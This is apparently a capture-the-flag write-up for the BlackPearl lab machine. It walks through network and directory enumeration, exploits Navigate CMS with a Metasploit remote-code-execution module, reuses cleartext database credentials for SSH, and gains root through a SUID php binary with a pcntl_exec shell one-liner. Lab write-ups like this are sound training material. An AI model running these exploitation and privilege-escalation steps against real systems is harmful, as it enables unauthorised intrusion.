# CTF - BlackPearl

## Scanning and Enumeration

### 1. Nmap scan to discover victim

	sudo nmap -sn 192.168.100.1/24

Result : ./discovery-scan
Target IP : 192.168.100.190

### 2. Scanning Target IP

	sudo nmap -A -sC -sV 192.168.100.190

Result : ./nmap-initial

#### Open Ports: 

- 22/tcp ssh v:OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 53/tcp domain ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
- 80/tcp http nginx 1.14.2

#### operating System

Running: Linux 4.X|5.X

OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5

OS details: Linux 4.15 - 5.6

### 3. Exploring directories (NO LUCK)

	sudo gobuster dir -u http:192.168.100.190/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

Result: ./directory-burst1 

Directories found: /secret

- 'Secret' was a file which was downloaded and contains a note directory bursting won't help ;(

### 4. Enumerating DNS

- As we see above port 53 is open, so most likely a DNS server is running.
- We will now use a tool called 'nslookup' to gather information.

Vislaize:

![nslookup](https://user-images.githubusercontent.com/60139669/152702255-8698f65d-2fb8-466f-9d1c-bf91b98d87ff.png)


- The localhost query produced a domain name.
- Browser can't reach the domain.

#### Modifying /etc/hosts

- this file is used to map domains and sub-domains to any IP adderess.
- Add the entry with domain name enumerated above and IP address of the target.

Visulaize:

![etc-hosts-edit](https://user-images.githubusercontent.com/60139669/152702200-437ba6d1-6e85-4366-9fba-f413e7adfc98.png)


	192.168.100.190	blackpearl.tcm

- We can access the domain now through a browser.
- Php homepage is loaded.

### 5. Exploring directories (AGAIN!!)

	sudo gobuster dir -u http://blackpearl.tcm/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

Result: ./directory-burst2
Directories found: /navigate

- The webpage with '/navigate' loads a login page at  '/navigae/login.php'. We notice that the server is running php.
- Directory bursting after /naviagte/ with '.php' extension.

		gobuster dir -u http://blackpearl.tcm/navigate/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php

Result: directory-burst3


### 6. Exploitation

CVE: 2018-17553 2018-17552
Ref: https://www.exploit-db.com/exploits/45561

Descrption: This exploit bypassses authentication bacause of the insufficient sanitization in the database. After, there is an path traversal vulnerability in navigate_upload.php, which could be used to upload the payload to arbitray locations.


- We can use this exploit with metasploit.

		1	msf > use exploit/multi/http/navigate_cms_rce
		2	msf exploit(navigate_cms_rce) > show targets
		3	   	...targets...
		4	msf exploit(navigate_cms_rce) > set TARGET < target-id >
		5	msf exploit(navigate_cms_rce) > show options
		6    	...show and set options...
		7	msf exploit(navigate_cms_rce) > exploit 

- One meterpreter starts, enter 'shell' to get the machine shell.
- 'python3 -c 'import pty;pty.spawn("/bin/bash")'' use this to spawn an interactive terminal using python.

### 7. Privilege escalation

- Navigate to '/var/www/blackpearl.tcm/navigate/cfg' and cat globals.php to read the contents of thef file.
- There is a databse connection call with password and username is written in clear text.

		...
		define('PDO_USERNAME', "alek");
		define('PDO_PASSWORD', "H4x0r");
		define('PDO_DRIVER',   "mysql");
		...

- ssh connection using these credentials

- download linpease - Linux Privilege Escalation Awesome Script
- It scans the entire machine and provide you reasults on potential escaltion paths.

- Scroll down under Interesting information

		rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary)

- 's' in 'rws' means that any user can run this specific file under root.
- Navigate to the webpage https://gtfobins.github.io/gtfobins/php/#suid
- It contains list of binaries in linux system which can be used to escalate privileges in misconfigured syetems.

		php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"

- Run thhis to get the root access shell.
